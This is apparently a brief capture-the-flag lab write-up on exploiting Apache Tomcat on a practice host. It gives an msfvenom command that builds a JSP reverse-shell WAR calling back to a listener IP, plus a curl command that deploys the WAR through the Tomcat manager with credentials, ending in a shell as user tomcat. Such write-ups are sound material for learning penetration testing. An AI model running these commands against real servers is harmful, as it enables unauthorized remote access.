 Found a link for Apache tomcat pentesting https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/ 
- Generated a reverse shell .war file using MSFVenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORt=443 -f war > shell.war
```
- Uploaded the .war file 
```bash
curl --upload-file shell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahosting.htb:8080/manager/text/deploy?path=/shell" 
```
- Navigated to http://megahosting.htb:8080/shell 
- Got reverse shell as user `tomcat`